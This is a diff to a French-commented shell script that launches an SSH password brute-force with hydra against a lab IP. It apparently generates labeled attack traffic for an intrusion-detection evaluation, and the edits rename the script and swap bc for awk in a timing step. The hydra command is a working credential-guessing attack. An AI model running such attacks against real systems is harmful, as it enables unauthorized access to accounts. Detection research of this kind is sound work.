@@ -13,10 +13,10 @@
 #   - hydra installé (par défaut sur Kali)
 #
 # Usage :
-#   ./run_s1_ssh_bruteforce.sh <target_ip> <ssh_user> <wordlist_file>
+#   ./ssh_bruteforce.sh <target_ip> <ssh_user> <wordlist_file>
 #
 # Exemple :
-#   ./run_s1_ssh_bruteforce.sh 10.0.1.20 server wordlist_s1.txt
+#   ./ssh_bruteforce.sh 10.0.1.20 server wordlist_s1.txt
 
 set -euo pipefail
 
@@ -66,7 +66,9 @@ hydra -l "$USER" -P "$WORDLIST" -t "$THREADS" -f -o "$LOGFILE" "ssh://${TARGET}"
 
 TS_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
 TS_END_EPOCH=$(date +%s.%N)
-DURATION=$(echo "$TS_END_EPOCH - $TS_START_EPOCH" | bc)
+# Calcul de durée sans dépendance à `bc` (non installé par défaut sur Kali) :
+# awk gère les flottants nativement.
+DURATION=$(awk -v a="$TS_START_EPOCH" -v b="$TS_END_EPOCH" 'BEGIN{printf "%.3f", b-a}')
 
 # Métadonnées de la run, utiles pour le dataset (labeled/eval) et le calcul
 # de la latence de détection (Phase 8.2 du protocole d'évaluation)
